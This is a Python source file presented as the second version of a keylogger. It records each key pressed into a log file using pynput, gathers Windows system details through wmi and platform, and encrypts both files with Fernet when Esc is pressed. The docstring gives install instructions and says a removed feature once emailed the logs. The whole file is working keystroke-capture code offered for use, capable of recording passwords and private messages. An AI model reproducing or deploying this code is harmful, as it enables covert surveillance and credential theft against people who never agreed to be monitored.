'''
Developed by Orlando Companioni

This is the second version of the keylogger, it logs the keys pressed and the numbers pressed then it sends it to a file and ecrypts it.
It also logs the system information and sends it to a file and encrypts it.
Dont forget to install and import the pynput library.
Use: pip install pynput
Press esc to stop the listener and to encrypt the files.
This had email incorporated but sadly google changed their policies and I haven't found a way to work around that.
'''
import sys #This is for exiting the program
import wmi #This will only work on windows
import platform #This allows me to find information about the computer
from pynput import keyboard #importing the pynput library
from cryptography.fernet import Fernet #This is for encryption

file_list=[] # this list stores the files that will be encrypted
log_file='keylog.txt'
file_list.append(log_file)
sys_info_file='sys_info.txt'
file_list.append(sys_info_file)

def main():
    system_info() #This function logs the system information
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    #This function starts the listener
    listener.start()
    input()
    
def key_Generator(): #This function generates the key for encryption
    key = Fernet.generate_key()
    with open('key_encrypt.key', 'wb') as key_file:
        key_file.write(key)

def on_press(key):
    #This function logs the keys pressed
    #The numbers are in a list because they are not characters
    numbers=["<96>","<97>","<98>","<99>","<100>","<101>","<102>","<103>","<104>","<105>"]
    print(f"{key} pressed")
    with open('keylog.txt', 'a') as log: # this opensthe file as append and closes the file once its finished
        try:
            if str(key) not in numbers:
                log.write(str(key.char)) #If the key is a character it will be logged as a string
            else :
                number=convert(key)
                log.write(number) #If the key is a number it will be logged as a string
        except AttributeError: 
            #If a special key is pressed, it will be logged as a string
            if key == key.space:
                #If its a space key it will put a new line
                log.write("\n")
            elif key == key.enter:
                log.write("\n")
            elif key == key.backspace:
                log.write("|b|")# to know there was a backspace and to erase the previous character when reading it
            elif key == key.tab:
                log.write(" ")
    
def on_release(key): 
    #This functions stops the listener when the esc key is pressed
    if key == keyboard.Key.esc:
        encryptor() #This function encrypts the files
        print("Closing the listener")
        sys.exit()
       
def system_info():
    #This function logs the system information into a different file that will be created
    global file_list
    computer = wmi.WMI()
    proc_info=computer.Win32_Processor()[0]
    system_info=platform.uname()
    with open('sys_info.txt','w') as sys:
        sys.write(f"System:{system_info.system}\nNode:{system_info.node}\n\
Release:{system_info.release}\nVersion:{system_info.version}\n\
Machine:{system_info.machine}\nProcessor:{system_info.processor} {proc_info.Name}\n")

def convert(key): #This converts the key to a number and returns it
    numConvert = {"<96>":"0","<97>":"1","<98>":"2","<99>":"3","<100>":"4","<101>":"5","<102>":"6","<103>":"7","<104>":"8","<105>":"9"}
    if str(key) in numConvert:
        return numConvert[str(key)]

def encryptor():
    #This function encrypts the file
    key_Generator() #This function generates the key for encryption
    #This opens the key file and reads it
    with open('key_encrypt.key', 'rb') as key_file:
        newkey = key_file.read()
    fernet = Fernet(newkey) #This creates the fernet object
    #This loops through the file list and encrypts the files
    for file in file_list:
        with open(file, 'rb') as opened_file:
             original_info= opened_file.read() #This reads the original file
        encrypted = fernet.encrypt(original_info) #This encrypts the original info
        with open(file, 'wb') as encrypted_file: #This rewrites the information in the original file with the encrypted info
            encrypted_file.write(encrypted)

def get_fileList():
    return file_list
    
if __name__ == '__main__': 
    main()
